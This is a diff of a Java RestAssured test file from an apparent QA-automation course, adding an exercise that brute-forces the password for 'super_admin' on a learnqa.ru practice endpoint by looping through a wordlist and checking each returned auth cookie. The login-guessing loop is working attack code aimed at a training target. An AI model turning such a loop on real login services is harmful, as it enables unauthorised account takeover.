@@ -1,10 +1,12 @@
 
-import io.restassured.http.Headers;
+
 import io.restassured.response.Response;
-import org.junit.jupiter.api.Assertions;
 import org.junit.jupiter.api.Test;
 import io.restassured.RestAssured;
 
+import java.io.BufferedReader;
+import java.io.FileReader;
+import java.io.IOException;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -14,7 +16,64 @@ public class RestAssuredTests {
     @Test
     public void testRestAssured() throws InterruptedException {
 
-// Ex8: Токены ===========================================
+//Ex9: Подбор пароля
+
+        Map<String, String> testData = new HashMap<>();
+
+        String cookie;
+        int code;
+
+        try {
+            BufferedReader in = new BufferedReader(new FileReader("src/test/resources/testData"));
+            String str;
+
+            while ((str = in.readLine()) != null) {
+                testData.put("login", "super_admin");
+                testData.put("password", str);
+                System.out.println("\n" + str);
+
+                Response getCookie = RestAssured
+                        .given()
+                        .body(testData)
+                        .when()
+                        .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
+                        .andReturn();
+
+                 getCookie.prettyPrint();
+
+
+                cookie = getCookie.getCookie("auth_cookie");
+                System.out.println("\n" + cookie);
+
+                Response checkAuth = RestAssured
+                        .given()
+                        .queryParam("auth_cookie", cookie)
+                        .when()
+                        .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
+                        .andReturn();
+                checkAuth.prettyPrint();
+
+                String answer = checkAuth.htmlPath().getString("body");
+                checkAuth.prettyPrint();
+
+                if (answer.equals("You are authorized")) {
+                    System.out.println("Правильный пароль: " + str);
+                    break;
+
+                }
+            }
+            in.close();
+    } catch (IOException e) {}
+
+
+
+
+
+
+
+
+
+/*  Ex8: Токены ===========================================
         Map<String, String> data = new HashMap<>();
 
         Response  startWork = RestAssured
@@ -57,7 +116,7 @@ public class RestAssuredTests {
         Assertions.assertNotEquals(null, result);
 
 
-/* Ex7: Долгий редирект ======================================
+   Ex7: Долгий редирект ======================================
 
         String url = "https://playground.learnqa.ru/api/long_redirect";
         int codeResponse = 0;
